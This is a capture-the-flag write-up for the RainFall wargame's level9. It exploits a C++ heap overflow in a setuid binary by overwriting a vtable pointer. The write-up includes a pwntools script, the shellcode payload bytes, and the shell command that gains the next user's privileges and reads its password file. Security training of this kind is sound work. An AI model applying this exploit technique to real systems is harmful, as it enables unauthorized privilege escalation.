```
level9@RainFall:~$ ll
total 17
dr-xr-x---+ 1 level9 level9   80 Mar  6  2016 ./
dr-x--x--x  1 root   root    340 Sep 23  2015 ../
-rw-r--r--  1 level9 level9  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level9 level9 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus0 users  6720 Mar  6  2016 level9*
-rw-r--r--+ 1 level9 level9   65 Sep 23  2015 .pass
-rw-r--r--  1 level9 level9  675 Apr  3  2012 .profile
```
let's try the binary
```
level9@RainFall:~$ ltrace ./level9
__libc_start_main(0x80485f4, 1, 0xbffff7f4, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)                                     = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                                                  = 0
_exit(1 <unfinished ...>
+++ exited (status 1) +++

level9@RainFall:~$ ltrace ./level9 oui
__libc_start_main(0x80485f4, 2, 0xbffff7e4, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)                                     = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                                                  = 0
_Znwj(108, 0xbffff7e4, 0xbffff7f0, 0xb7d79e55, 0xb7fed280)                                                             = 0x804a008
_Znwj(108, 5, 0xbffff7f0, 0xb7d79e55, 0xb7fed280)                                                                      = 0x804a078
strlen("oui")                                                                                                          = 3
memcpy(0x0804a00c, "oui", 3)                                                                                           = 0x0804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c)                                                = 0xb7fce4a0
+++ exited (status 11) +++
```

So we need something to put in the argc
We have to understand that this is not C, this is c++, which means that the weird things are method, or virtual methods.
what can we see ?
we see that there is 2 new Classes created, which are 108bytes long,
we can see that the memcpy takes the adress of the first class, but with +4, why is that ?
it is because of the padding due to the vtable. (Table of function's pointer).
So here is what we are going to do,
We have to change the adress of the vtable, We can for example create a fake one.
We also have to make a shellcode that will open the shell as we always want.
then we will have to fill the buffer.
Let's try that:
```
  nvim main.py
  cat main.py
import pwn

shellcode = pwn.asm(pwn.shellcraft.sh()) # We get the shellcode to open sh
s_len = len(shellcode) # We take the len, because we use it twice

adress = 0x0804a00c # memcpy sent adress
fake_addr = adress + s_len # the end of the shellcode in the buffer
payload = shellcode # We put the shellcode in the buffer
payload += pwn.p32(adress) # We add the begining of the buffer in the payload, it is the pointer to the function
# p32 is used to put the adress in little endian so we don't have to make it ourselves ;)
payload += b'A' * (108 - len(payload)) # We fill to overflow to the second class
payload += pwn.p32(fake_addr) # And we put the adress of the fake vtable in the second class
print(payload)

  python main.py
b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80\x0c\xa0\x04\x08AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8\xa0\x04\x08'
```
Ok so now let's put this into the binary
```
level9@RainFall:~$ ./level9 $(python -c 'print "jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80\x0c\xa0\x04\x08AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8\xa0\x04\x08"')
$ whoami
bonus0
$ cd ..
$ cd bonus0
$ ls -la
total 17
dr-xr-x---+ 1 bonus0 bonus0   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus0 bonus0  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus0 bonus0 3530 Sep 23  2015 .bashrc
-rw-r--r--+ 1 bonus0 bonus0   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus0 bonus0  675 Apr  3  2012 .profile
-rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0
$ cat .pass
<hidden>
```
Congrats
